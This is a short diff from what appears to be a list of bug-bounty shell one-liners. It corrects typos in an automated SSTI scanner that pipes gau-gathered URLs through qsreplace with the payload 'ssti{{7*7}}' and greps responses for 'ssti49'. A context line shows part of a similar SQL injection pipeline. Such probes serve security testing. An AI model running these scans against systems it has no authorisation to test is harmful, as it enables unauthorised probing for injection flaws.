@@ -507,5 +507,5 @@ cat url.txt | gau | egrep -v '(.js|.png|.svg|.gif|.jpg|.txt)'|tee sqli.txt && sq
 ### Automated SSTI (Server-Side Template Injection) Vulnerability Scanner
 > @tholkappiar
 ```bash
-cat urls.txt | gau -subs|grep '='l egrep -v '(.jsl.pngl.svgl.gifl.jpg.jpeg|.txt.css.ico)'l qsreplace "ssti{{7*7}}" | while read url; do cur=$(curl -s $url | grep "ssti49"); echo -e "$url -> $cur"; done
+cat url.txt | gau -subs | grep '=' | egrep -v '(\.js|\.png|\.svg|\.gif|\.jpg|\.jpeg|\.txt|\.css|\.ico)' | qsreplace "ssti{{7*7}}" | while read url; do cur=$(curl -s $url | grep "ssti49"); echo -e "$url -> $cur"; done
 ```
